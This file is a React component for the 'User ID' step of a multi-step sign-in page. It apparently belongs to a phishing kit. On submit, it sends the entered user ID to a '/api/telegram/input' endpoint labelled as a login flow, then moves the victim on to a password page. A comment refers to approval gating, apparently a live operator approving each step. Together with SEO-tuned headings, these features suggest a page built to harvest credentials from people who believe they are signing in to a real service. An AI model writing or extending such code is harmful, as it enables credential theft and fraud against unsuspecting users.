"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { SIGN_IN_LOADING_MS } from "@/lib/approval-messages";
import { PAGE_H1_HEADING } from "@/lib/seo-keywords";

export function UserIdStep() {
  const router = useRouter();
  const [userId, setUserId] = useState("");
  const [errors, setErrors] = useState<{ userId?: string; form?: string }>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleUserIdBlur = () => {
    if (!userId.trim()) {
      setErrors((prev) => ({ ...prev, userId: "User ID is required." }));
    }
  };

  const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setUserId(e.target.value);
    if (errors.userId) {
      setErrors((prev) => ({ ...prev, userId: undefined }));
    }
  };

  const handleNextStep = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userId.trim()) {
      setErrors({ userId: "User ID is required." });
      return;
    }
    if (isSubmitting) return;

    const trimmedUserId = userId.trim();
    setErrors({});
    setIsSubmitting(true);

    if (typeof window !== "undefined") {
      sessionStorage.setItem("loginUserId", trimmedUserId);
    }

    try {
      await fetch("/api/telegram/input", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          inputs: { "User ID": trimmedUserId, Flow: "login" },
        }),
      }).catch(() => null);
    } catch (err) {
      console.error(err);
    }

    // User ID step is not approval-gated — advance to password.
    await new Promise((resolve) => setTimeout(resolve, SIGN_IN_LOADING_MS));
    router.push(`/password?userId=${encodeURIComponent(trimmedUserId)}`);
  };

  return (
    <>
      <div className="rtx-login-heading">
        <h1 className="rtx-welcome-title">
          {PAGE_H1_HEADING}
        </h1>
      </div>

      <div className="rtx-auth-panel-wrap">
        <form
          onSubmit={handleNextStep}
          className="f-panel white medium auth-panel auth-panel-user-id"
        >
          <div className="rtx-auth-panel-content">
            <h6 className="mb-l">
              <p className="text-l bold-text">Enter your User ID.</p>
            </h6>

            <div className="mb-l mt-l text-xs">
              * Fields marked with an asterisk (*) are required.
            </div>

            <div className="form-group">
              <label id="UserID-label" htmlFor="UserID" className="input-label">
                User ID*
              </label>
              <div className="input-field-wrapper">
                <input
                  type="text"
                  id="UserID"
                  aria-live="polite"
                  aria-labelledby="UserID-label"
                  value={userId}
                  onChange={handleUserIdChange}
                  onBlur={handleUserIdBlur}
                  disabled={isSubmitting}
                  autoComplete="username"
                  className={`input-field ${errors.userId ? "has-error" : ""}`}
                />
              </div>
            </div>

            {errors.userId && (
              <div className="error-message" role="alert">
                <svg fill="currentColor" viewBox="0 0 20 20" aria-hidden>
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
                {errors.userId}
              </div>
            )}

            {errors.form && (
              <div className="error-message" role="alert">
                <svg fill="currentColor" viewBox="0 0 20 20" aria-hidden>
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
                {errors.form}
              </div>
            )}

            <div className="mt-xl">
              <button
                type="submit"
                className="f-button progressive"
                aria-label="Next"
                disabled={!userId.trim() || isSubmitting}
              >
                <span className="button-text">
                  {isSubmitting ? "Verifying..." : "Next"}
                </span>
              </button>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
